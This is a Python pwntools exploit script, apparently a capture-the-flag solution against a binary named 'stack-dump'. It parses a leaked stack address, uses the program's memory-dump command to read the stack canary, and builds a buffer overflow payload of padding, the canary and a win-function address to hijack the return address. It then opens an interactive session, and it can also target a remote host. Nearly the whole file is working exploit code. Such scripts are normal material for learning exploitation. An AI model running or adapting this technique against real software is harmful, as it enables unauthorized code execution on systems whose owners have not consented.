from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "stack-dump").resolve().__str__()
FRAME_SIZE = 0x58
BUFF_SIZE = 56
STACK_TO_RBP = 24
# now ADD eight bytes for the return address
OFFSET_TO_CANARY = 65  # 0x41
win_addr = p64(0x4012F6, "little")


gdb_script = """
b *main
b *loop+70
b *loop+281
c
"""


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


# TODO: Add the ip address here later!
def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvlinesS(1)
print("____________________________________")
print(res)
print("____________________________________")
res = io.recvlinesS(1)
matched = re.search(r"0x[0-9A-Fa-f]+", res[0])
leaked_addr = matched.group(0)
leaked_addr_int = int(leaked_addr, base=16)
print(f"Received address: {leaked_addr}")

canary_address = leaked_addr_int + OFFSET_TO_CANARY
print(f"Canary address calculated at:  {hex(canary_address)}")
print("____________________________________")

io.sendline(b"i")
io.sendline(p64(canary_address) + b"\n")
io.sendline(b"D")
io.recvuntil(b"memory at " + hex(canary_address).encode("ascii") + b": ")


canary = io.recv(8)
print(f"We got the canary: 0x{canary.hex()}")
print(f"We got the canary: 0x{canary}")

le_can = p64(u64(canary), "little")
be_can = p64(u64(canary), "big")
print("____________________________________")
# Create the payload
#
padding = b"B" * BUFF_SIZE
padding_to_ret_addr = STACK_TO_RBP * b"B"
payload: bytes = padding + le_can + padding_to_ret_addr + win_addr
print(f"The payload is {payload.hex()}")
print(f"Now send the payload!!")


# Now send the payload
io.sendline(b"i")
io.sendline(payload + b"\n")
# We need this newline
io.sendline(b"\n")

io.sendline(b"q")


io.interactive()
